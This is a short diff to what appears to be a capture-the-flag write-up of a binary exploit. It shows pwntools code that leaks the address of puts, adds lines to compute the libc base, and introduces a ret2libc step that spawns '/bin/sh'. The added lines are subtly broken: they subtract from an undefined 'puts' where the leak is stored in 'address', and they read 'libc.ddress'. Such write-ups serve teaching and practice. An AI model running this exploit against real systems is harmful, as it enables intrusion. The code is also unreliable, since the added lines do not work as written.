@@ -150,6 +150,8 @@ p.sendlineafter('> ',leak)
 p.recvuntil('ingored\n')
 address= u64(p.recv(6) + b'\0\0')
 log.info('puts: ' + hex(address))
+libc.address = puts - libc.sym.puts
+log.info('libc.address: ' + hex(libc.ddress))
 ```
 #### RET2LIBC
 * Now that we have our addresses, we have to do a basic ret2libc. We have to overflow again and pop the address of "/bin/sh" in RDI .
